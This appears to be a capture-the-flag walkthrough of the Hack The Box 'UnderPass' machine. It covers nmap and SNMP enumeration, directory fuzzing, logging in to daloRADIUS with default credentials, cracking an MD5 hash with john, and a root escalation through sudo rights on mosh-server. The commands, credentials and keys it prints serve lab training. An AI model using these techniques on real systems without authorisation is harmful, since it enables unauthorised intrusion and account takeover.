<img width="1395" height="722" alt="image" src="https://github.com/user-attachments/assets/9e56e053-670a-4975-9652-82efa34bfb99" /># -HTB-UnderPass

### Start with a nmap scan
```
nmap -sVC -p- 10.10.11.48 -oN nmap_scan --min-rate 5000
```
> - `-sVC`: Detect service/version /// Run default scripts
> - `-oN`: Output to file (normal format)
> - `--min-rate 5000`: Fast scan 5000 p/s

<img width="903" height="310" alt="image" src="https://github.com/user-attachments/assets/13e659ce-3fc0-4a19-8c45-eadbccd4c34d" />

### Port 80 it s a  Apache2 Default Page 

<img width="1557" height="961" alt="image" src="https://github.com/user-attachments/assets/44dd2672-0a97-4fe8-85ff-477b3acdd337" />

### We use nmap for scan UDP ports :
```
nmap --top-ports 100 10.10.11.48 -oN nmap_scan2 -sU
```
> - `-sU`: For UDP scan

<img width="780" height="145" alt="image" src="https://github.com/user-attachments/assets/ba2e4886-5dff-4d0e-8abd-e5167d31a233" />

### I use snmp-check for enumerating the SNMP 
__SNMP__ -> (Simple Network Management Protocol) is an IP-based application-layer protocol that allows administrators to monitor and manage network devices like routers, switches, and servers.
```
snmp-check 10.10.11.48 -c public 
```
> - `-c public `: for community string
<img width="1028" height="286" alt="image" src="https://github.com/user-attachments/assets/d8717794-34fb-4ea4-984a-4fab4c1822bc" />

### We try to acces the site with /daloradius , but we receive a 403 Forbidden 
```
http://underpass.htb/daloradius/
```
<img width="783" height="313" alt="image" src="https://github.com/user-attachments/assets/f7ede567-8f69-4e94-b54c-6d975f43a82b" />

### After see the darlordius give us an " You don't have permission to access this resource. " I try to fuzzing this directory with feroxbuster 
```
feroxbuster -u http://underpass.htb/daloradius/ 
```
<img width="1395" height="722" alt="image" src="https://github.com/user-attachments/assets/ec1c4498-3e34-41a6-9f6d-8936270df5aa" />

### Some of them give us the same 403 Forbidden but " http://underpass.htb/daloradius/app/users/ " redirect us to a loggin page how it s not working with deffault credtials :

<img width="1747" height="857" alt="image" src="https://github.com/user-attachments/assets/8cba11eb-ebef-447c-bcde-a137807277cd" />

### I peek a little bit on the walk where it s giving us an article "https://kb.ct-group.com/radius-holding-post-watch-this-space" where it s mentioneted a diferent path "http://<ip-address>/daloradius/app/operators" , after trying this path we see we can connect to the main php srv with the deffault creds  
```
administrator:radius
```
<img width="1912" height="805" alt="image" src="https://github.com/user-attachments/assets/8deb23a1-5e54-4773-8ed9-06163705e0bf" />

### I find on thw Management -> List Users -> The md5 hash of svcMosh
```
svcMosh:412DD4759978ACFCC81DEAB01B382403
```
### Let s use john to cruck this pass :
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 
```
<img width="889" height="179" alt="image" src="https://github.com/user-attachments/assets/59846d19-41b4-40fb-9bcc-00453ada763c" />

```
svcMosh:underwaterfriends
```

### We use ssh to connect and get the user.txt :

<img width="753" height="651" alt="image" src="https://github.com/user-attachments/assets/050fc6e8-9448-4d9f-8acd-184d7ff94b0a" />

### For root we can see the svcMoch can run the cmd "/usr/bin/mosh-server" of any user :


<img width="1085" height="327" alt="image" src="https://github.com/user-attachments/assets/1f4c0fa2-2bb0-49d0-8cbb-fb8f91001863" />

### If we run the sudo with the cmd we can see we get a MOSH CONNECT key on port 60004 : 


<img width="767" height="315" alt="image" src="https://github.com/user-attachments/assets/0103e0c2-0b9d-497b-8906-05fdc8a0b102" />
```
b0pK0rewoWSpfwl0ELRw0A
```

### I install "mosh" and use the cmd on the official mosh site 
<img width="1409" height="800" alt="image" src="https://github.com/user-attachments/assets/1d68f732-611d-45a1-8f15-9351a7385d87" />

```
MOSH_KEY=b0pK0rewoWSpfwl0ELRw0A mosh-client 10.10.11.48 60004
```
### And we get root where we find the root flag

<img width="427" height="130" alt="image" src="https://github.com/user-attachments/assets/68e55560-3a1c-4da9-9f70-861d98cd1762" />





